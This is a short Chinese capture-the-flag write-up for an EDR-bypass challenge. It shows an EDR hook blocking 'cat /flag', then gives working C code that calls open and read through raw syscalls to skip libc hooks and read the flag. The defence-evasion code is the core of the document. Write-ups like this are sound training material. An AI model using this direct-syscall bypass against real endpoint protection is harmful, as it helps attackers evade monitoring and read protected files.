# 内网渗透与高级社工-终端EDR绕过-G3 WriteUp

当使用libc的open文件访问封装函数时，EDR会hook该函数，阻止访问敏感文件。

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    system("cat /flag");  // cat命令由于调用了libc的open函数，会被EDR拦截
    return 0;
}
```

输出：

```
__EDR_ALERT__ userland hook blocked open("/flag")
cat: /flag: Permission denied
```

但是，通过直接进行更加底层的系统调用(syscall)，可以绕过EDR的检测

```c
#include <stdio.h>
#include <sys/syscall.h> // SYS_open, SYS_read操作符定义
#include <unistd.h> //unix standard，syscall函数

char buffer[100];

int main() {
    long fd = syscall(SYS_open, "/flag", 0); 
    syscall(SYS_read, fd, buffer, sizeof(buffer));
    printf("%s\n", buffer);
    return 0;
}
```

成功获取flag